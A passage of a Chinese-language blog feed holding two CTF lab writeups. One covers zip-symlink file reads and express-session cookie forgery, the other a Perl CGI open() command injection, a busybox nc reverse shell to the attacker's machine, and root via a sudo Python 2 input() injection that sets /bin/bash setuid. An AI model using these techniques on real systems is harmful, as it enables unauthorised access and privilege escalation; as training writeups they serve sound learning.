<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Cookie:connect.sid=s%3AqjWsoge3FMrbqjQmGG5rzy6I_MX0Tatu.1Ujge2Br%2FEeeJJLis%2Fw1ArMclERRnH93iBgoy%2FOPzXc</span><br></pre></td></tr></table></figure>

<p>这个 cookie 也是比较标准的 <code>express-session</code> 的形式，就是源代码里使用的 session 控制。</p>
<p>查看 docker 的文件列表发现，有个 <code>.env</code> ，查看其内容，发现了 <code>SESSION_SECRET</code> ：</p>
<p><img src="image2.webp" alt="image2"></p>
<p>这里是 <code>&lt;REDACTED&gt;</code> 在实际的题目容器里面应该是个确切的值。</p>
<p>在 web 页面里面，点去 <code>upload</code> 那里，我们可以上传一个 zip 文件：</p>
<p><img src="image3.webp" alt="image3"></p>
<p>前面的分析中提到，我们上传 zip 文件之后，后台会对这个文件进行解压，并且会给我们提供下载解压后的文件的功能。</p>
<p>为了得到 <code>.env</code> ，我们可以尝试创建一个软链接，指向 <code>.env</code> ，然后下载该软链接看看。</p>
<p>在 docker 以及前面的代码中我们可以看到，我们上传的文件目录是在 <code>uploads/&lt;userId&gt;</code> 里面：</p>
<p><img src="image4.webp" alt="image4"></p>
<p>所以我们要创建指向 <code>../../.env</code> 的软链接，并压缩：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/ctf/TCTF]</span><br><span class="line">└─$ <span class="built_in">ln</span> -s <span class="string">&#x27;../../.env&#x27;</span> aaa </span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/ctf/TCTF]</span><br><span class="line">└─$ zip -y poc.zip aaa            </span><br><span class="line">  adding: aaa (stored 0%)</span><br></pre></td></tr></table></figure>

<p>上传之后，看到了我们上传的文件列表：</p>
<p><img src="image5.webp" alt="image5"></p>
<p>下载之后，我们获得了在 docker 里的 <code>.env</code> ：</p>
<p><img src="image6.webp" alt="image6"></p>
<p>说明软链接可行。</p>
<p>除了这个 <code>.env</code> 之外，我们还得知道 <code>server.js</code> 里的 <strong>develop</strong> 的 <code>session ID</code> 才行，同样用软链接就好。</p>
<p>等获取完两个东西之后，我们还得知道怎么伪造 <code>develop</code> 的 <strong>cookie</strong> 才行。</p>
<p>问了一下 deepseek ，它给了我一个代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> signature = <span class="built_in">require</span>(<span class="string">&#x27;cookie-signature&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sid = <span class="string">&#x27;s:&#x27;</span> + signature.<span class="title function_">sign</span>(<span class="string">&#x27;&lt;SESSION ID&gt;&#x27;</span>, <span class="string">&#x27;&lt;SESSION_SECRET&gt;&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(sid);</span><br></pre></td></tr></table></figure>

<p>下面就开环境打了。</p>
<p>构造两个软链接，获取 <code>SESSION_SECRET</code> 和 <code>SESSION ID</code> ：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/ctf/TCTF]</span><br><span class="line">└─$ <span class="built_in">ln</span> -s <span class="string">&#x27;../../.env&#x27;</span> aaa</span><br><span class="line">                                           </span><br><span class="line">┌──(kali㉿kali)-[~/ctf/TCTF]</span><br><span class="line">└─$ zip -y poc.zip aaa            </span><br><span class="line">  adding: aaa (stored 0%)</span><br><span class="line">                         </span><br><span class="line">┌──(kali㉿kali)-[~/ctf/TCTF]</span><br><span class="line">└─$ <span class="built_in">ln</span> -s <span class="string">&#x27;../../server.js&#x27;</span> bbb</span><br><span class="line">                         </span><br><span class="line">┌──(kali㉿kali)-[~/ctf/TCTF]</span><br><span class="line">└─$ zip -y poc.zip bbb</span><br><span class="line">  adding: bbb (stored 0%)</span><br></pre></td></tr></table></figure>

<p><img src="image7.webp" alt="image7"></p>
<p><img src="image8.webp" alt="image8"></p>
<p><img src="image9.webp" alt="image9"></p>
<p>用这两个内容，在 docker 里用刚才的 js 代码获取 <strong>develop</strong> 的 cookie：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">s:amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE</span><br></pre></td></tr></table></figure>

<p>用该 cookie 访问网页试试：</p>
<p><img src="image10.webp" alt="image10"></p>
<p>现在我们变成了 <strong>develop</strong> ，配合 <code>X-Forwarded-For</code> 头，我们可以访问 <code>/debug/files</code> 路由：</p>
<p><img src="image11.webp" alt="image11"></p>
<p>他说 <code>PATH</code> 是空的，是因为前面的代码中我们看到，该路由还需要传递 <code>session_id</code> 参数才行，那我们就给他 <code>session_id=../../../../</code> :</p>
<p><img src="image12.webp" alt="image12"></p>
<p>可以看到页面显示出来了根目录的文件，那个框起来的随机文件名里面应该就存在着 <strong>flag</strong>，这里还没法直接下载，还得创造一个软链接来指向里面的 flag，才能下载：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/ctf/TCTF]</span><br><span class="line">└─$ <span class="built_in">ln</span> -s <span class="string">&#x27;../../../../../tlhedn6f/flag.txt&#x27;</span> flag</span><br><span class="line">                           </span><br><span class="line">┌──(kali㉿kali)-[~/ctf/TCTF]</span><br><span class="line">└─$ zip -y poc.zip flag</span><br><span class="line">  adding: flag (stored 0%)</span><br></pre></td></tr></table></figure>

<p>上传这个 zip 文件之后，下载其中的 flag：</p>
<p><img src="image13.webp" alt="image13"></p>
]]></content>
      <tags>
        <tag>TFCCTF</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>MazeSec-Per1</title>
    <url>/2025/08/09/MazeSec-Per1/</url>
    <content><![CDATA[<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- 192.168.0.107</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 00:31 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.107</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: E6:F4:83:79:2E:CF (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.38 seconds</span><br></pre></td></tr></table></figure>

<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>​	开了80和22端口，查看web页面：</p>
<p><img src="image1.webp" alt="image1"></p>
<p>​	页面是说，perl是个很优美的编程语言，并且举了一个perl代码的例子，但没有看到别的进一步渗透的信息。</p>
<p>​	那就查看一下源码，发现有一个很特别的提示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- cgi --&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	看到这个<strong>cgi</strong>，很自然就想到cgi-bin这个目录，再通过询问GPT，了解到perl语言如果写cgi脚本，一般文件后缀为cgi、pl，那就拿这两个后缀名爆破一下web页面的cgi-bin目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> gobuster <span class="built_in">dir</span>  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u http://192.168.0.107/cgi-bin -x cgi,pl</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> kali: </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.0.107/cgi-bin</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              cgi,pl</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/file.cgi             (Status: 200) [Size: 22]</span><br></pre></td></tr></table></figure>

<p>​	发现有个file.cgi文件，去访问：</p>
<p><img src="image2.webp" alt="image2"></p>
<p>​	他说缺少file参数，想必是个读文件的cgi，那就给他&#x2F;etc&#x2F;passwd，为了方便，采用curl：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.0.107/cgi-bin/file.cgi?file=/etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">sunset:x:1001:1001:,,,:/home/sunset:/bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​	可以看到返回了&#x2F;etc&#x2F;passwd的内容，而且有个sunset用户是有home目录的。</p>
<p>​	那接下来，可以尝试读取sunset的.bash_history、.ssh&#x2F;id_rsa，但都没有结果。</p>
<p>​	下一步的思路，我是想看看file.cgi这个文件本身的内容是什么，因此我得知道这个cgi-bin目录的确切路径才行。</p>
<p>​	询问GPT，“perl写的cgi文件一般在linux的哪个目录下？”，GPT回答说在 <strong>&#x2F;var&#x2F;www&#x2F;cgi-bin</strong> 或者 <strong>&#x2F;usr&#x2F;lib&#x2F;cgi-bin</strong>，两个都尝试访问，发现file.cgi是在&#x2F;usr&#x2F;lib&#x2F;cgi-bin之下，查看内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.0.107/cgi-bin/file.cgi?file=/usr/lib/cgi-bin/file.cgi&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line">use CGI;</span><br><span class="line"><span class="built_in">print</span> CGI::header();</span><br><span class="line">my <span class="variable">$input</span> = CGI::param(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$input</span>) &#123;</span><br><span class="line">    open(FILE, <span class="variable">$input</span>);</span><br><span class="line">    <span class="built_in">print</span> <span class="keyword">while</span> &lt;FILE&gt;;</span><br><span class="line">    close(FILE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Missing file parameter&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	由于接触perl不多，上述源代码看上去也没有直接的可利用的地方，我就询问了GPT，问他这个代码有没有危险的地方，他说 <strong>“如果文件名包含管道符 <code>｜</code>或反引号<code>`</code>，perl的open函数可以执行命令，例如：”</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.107/cgi-bin/file.cgi?file=|id|</span><br></pre></td></tr></table></figure>

<p>​	尝试进行命令执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.0.107/cgi-bin/file.cgi?file=|id|&#x27;</span> </span><br><span class="line"></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure>

<p>​	可以看到执行了id命令，那就进行反弹shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.0.107/cgi-bin/file.cgi?file=|busybox nc 192.168.0.104 1234 -e /bin/bash|&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h2><p>​	成功反弹了shell，用python3稍微提升一下交互性：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nvlp 1234</span><br><span class="line"></span><br><span class="line">Listening on 0.0.0.0 1234</span><br><span class="line">Connection received on 192.168.0.107 45342</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">www-data@Per1:/usr/lib/cgi-bin$ </span><br></pre></td></tr></table></figure>

<p>​	在&#x2F;home&#x2F;sunset里找到了user flag:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag&#123;user-5b5b8e9b01ef27a1cc0a2d5fa87d7190&#125;</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>​	可以常规地在var、opt、home等目录里面找找信息，也可以找一下sunset这个用户的一些文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user sunset 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/opt/password.pl</span><br></pre></td></tr></table></figure>

<p>​	可以找到那个password.pl文件，ls看一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -liah /opt/password.pl</span><br><span class="line"></span><br><span class="line">784900 -rwxr-xr-x 1 sunset sunset 893 Aug  8 09:07 password.pl</span><br></pre></td></tr></table></figure>

<p>​	是sunset拥有的文件，且该文件我们有读取权限，读一下它：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">my</span> <span class="variable">@char_generator</span> = (</span><br><span class="line">    </span><br><span class="line">    [<span class="number">103</span>, <span class="number">3</span>],    </span><br><span class="line">    [<span class="number">126</span>, <span class="number">5</span>],    </span><br><span class="line">    [<span class="number">115</span>, <span class="number">7</span>],    </span><br><span class="line">    [<span class="number">98</span>,  <span class="number">1</span>],    </span><br><span class="line">    [<span class="number">112</span>, <span class="number">2</span>],    </span><br><span class="line">    [<span class="number">58</span>,  <span class="number">6</span>],    </span><br><span class="line">    [<span class="number">105</span>, <span class="number">4</span>],    </span><br><span class="line">    [<span class="number">122</span>, <span class="number">4</span>],    </span><br><span class="line">    [<span class="number">102</span>, <span class="number">5</span>]     </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> <span class="variable">@decoy_blocks</span> = (</span><br><span class="line">    &#123;<span class="string">values =&gt;</span> [<span class="number">66</span>, <span class="number">71</span>, <span class="number">77</span>], <span class="string">offsets =&gt;</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>]&#125;,</span><br><span class="line">    &#123;<span class="string">values =&gt;</span> [<span class="number">85</span>, <span class="number">90</span>, <span class="number">95</span>], <span class="string">offsets =&gt;</span> [<span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>]&#125;,</span><br><span class="line">    &#123;<span class="string">values =&gt;</span> [<span class="number">105</span>, <span class="number">110</span>, <span class="number">115</span>], <span class="string">offsets =&gt;</span> [<span class="number">3</span>, <span class="number">7</span>, <span class="number">2</span>]&#125;  </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">my</span> <span class="variable">$i</span> (<span class="number">0</span>..<span class="number">4</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$i</span> &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">my</span> (<span class="variable">$val</span>, <span class="variable">$off</span>) = @&#123;<span class="variable">$char_generator</span>[<span class="variable">$i</span>]&#125;;</span><br><span class="line">        <span class="variable">$output</span> .= <span class="keyword">chr</span>(<span class="variable">$val</span> - <span class="variable">$off</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span> == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">my</span> <span class="variable">$noise</span> = <span class="variable">$decoy_blocks</span>[<span class="number">0</span>]<span class="string">&#123;values&#125;</span>[<span class="number">0</span>] - <span class="variable">$decoy_blocks</span>[<span class="number">0</span>]<span class="string">&#123;offsets&#125;</span>[<span class="number">0</span>];</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">my</span> <span class="variable">$j</span> ((<span class="variable">$i</span> == <span class="number">3</span>) ? (<span class="number">3</span>..<span class="number">5</span>) : (<span class="number">6</span>..<span class="number">8</span>)) &#123;</span><br><span class="line">            <span class="keyword">my</span> (<span class="variable">$val</span>, <span class="variable">$off</span>) = @&#123;<span class="variable">$char_generator</span>[<span class="variable">$j</span>]&#125;;</span><br><span class="line">            <span class="variable">$output</span> .= <span class="keyword">chr</span>(<span class="variable">$val</span> - <span class="variable">$off</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">last</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$output</span> . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>​	看上去是个perl的代码，简单看一下内容也可以知道，他是在用一些简单的加密的方式输出一个密码，那就干脆找个在线的perl代码运行的网站运行一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.w3cschool.cn/tryrun/runcode?lang=perl5</span><br></pre></td></tr></table></figure>

<p>​	<img src="image3.webp" alt="image3"></p>
<p>​	运行的结果是dylan4，这应该就是sunset的密码，切换用户（或者ssh连接）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Per1:/opt$ su sunset</span><br><span class="line">su sunset</span><br><span class="line">Password: dylan4</span><br><span class="line"></span><br><span class="line">sunset@Per1:/opt$</span><br></pre></td></tr></table></figure>

<p>​	sudo -l，发现sunset用户可以执行一个python文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> sunset on Per1:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User sunset may run the following commands on Per1:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/python /usr/bin/guess_game.py</span><br></pre></td></tr></table></figure>

<p>​	看一下guess_game.py的内容:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_game</span>():</span><br><span class="line">    ans = random.randint(<span class="number">0</span>, <span class="number">65535</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Welcome to the guess game!&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;I&#x27;ve chosen a number between 0 and 65535.&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user_input = <span class="built_in">input</span>(<span class="string">&quot;Your guess: &quot;</span>)  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error:&quot;</span>, e</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user_input == ans:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Congratulations! You guessed it.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Wrong! The correct number was&quot;</span>, ans</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    guess_game()</span><br></pre></td></tr></table></figure>

<p>​	可以看到是个python2的代码，对于这里的漏洞不太熟悉的朋友，可以问问GPT，当然也可以自己运行看一下。</p>
<p>​	例如，运行之后，我随便输入了一点东西：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome to the guess game!</span><br><span class="line">I&#x27;ve chosen a number between 0 and 65535.</span><br><span class="line">Your guess: asd</span><br><span class="line">asd</span><br><span class="line">Error: name &#x27;asd&#x27; is not defined</span><br></pre></td></tr></table></figure>

<p>​	我输入了“asd”，他说” ‘asd’ is not defined”，这里用脚后跟想都绝对有问题，他没有把我的输入当成纯字符串处理，而是当成一个python代码来看。</p>
<p>​	那根据源码，他要比较我输入的东西和 <em>ans</em> 是否相等，那我就输入ans看一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome to the guess game!</span><br><span class="line">I&#x27;ve chosen a number between 0 and 65535.</span><br><span class="line">Your guess: ans</span><br><span class="line">ans</span><br><span class="line">Congratulations! You guessed it.</span><br></pre></td></tr></table></figure>

<p>​	果然，他说我猜对了，那就说明这里应该可以进行命令执行。</p>
<p>​	引入os，执行系统命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/bin/python /usr/bin/guess_game.py</span><br><span class="line"></span><br><span class="line">Welcome to the guess game!</span><br><span class="line">I<span class="string">&#x27;ve chosen a number between 0 and 65535.</span></span><br><span class="line"><span class="string">Your guess: __import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span><span class="built_in">chmod</span> +s /bin/bash<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">__import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span><span class="built_in">chmod</span> +s /bin/bash<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">Wrong! The correct number was 39444</span></span><br></pre></td></tr></table></figure>

<p>​	查看&#x2F;bin&#x2F;bash的权限情况：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -liah /bin/bash</span><br><span class="line"></span><br><span class="line">263242 -rwsr-sr-x 1 root root 1.2M Apr 18  2019 /bin/bash</span><br></pre></td></tr></table></figure>

<p>​	可以看到已经加了s权限，用&#x2F;bin&#x2F;bash -p提权就好了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sunset@Per1:/opt$ /bin/bash -p</span><br><span class="line">/bin/bash -p</span><br><span class="line">bash-5.0# <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">bash-5.0# <span class="built_in">cat</span> /root/root.txt</span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br><span class="line">flag&#123;root-c27679de03aba03c5a33159aef11f8ea&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Maze-Sec</tag>
        <tag>perl</tag>
        <tag>python</tag>
      </tags>
  </entry>
</search>
